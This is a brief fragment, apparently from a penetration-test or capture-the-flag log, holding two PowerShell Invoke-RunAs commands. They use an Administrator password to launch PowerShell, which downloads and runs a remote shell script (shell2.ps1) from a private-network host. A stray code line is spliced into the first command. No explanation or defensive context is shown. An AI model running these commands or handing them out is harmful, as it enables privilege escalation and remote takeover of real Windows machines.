...
Invoke-RunAs -User Administrator -Password 3130438f31186fbaf962f407711faddb -LogonType 0x1 -Binary c:\windows\sysnative\windowspowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.16.11/shell2.ps1')	if (!$CallResult) {
...
Invoke-RunAs -User Administrator -Password 3130438f31186fbaf962f407711faddb -LogonType 0x1 -Binary c:\windows\system32\windowspowershell\v1.0\powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.11/shell2.ps1')"
